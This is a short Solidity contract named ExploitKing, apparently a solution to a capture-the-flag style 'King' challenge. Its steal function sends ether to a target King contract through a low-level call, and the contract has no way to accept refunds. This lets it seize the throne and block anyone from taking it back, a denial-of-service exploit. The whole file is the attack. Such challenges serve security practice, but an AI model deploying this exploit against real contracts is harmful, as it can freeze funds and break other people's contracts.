pragma solidity ^0.4.18;

contract ExploitKing {
    // _target is address of King contract
   function steal(address _target) public payable {
       if (!_target.call.value(msg.value)()) {
           revert();
       }
   } 
}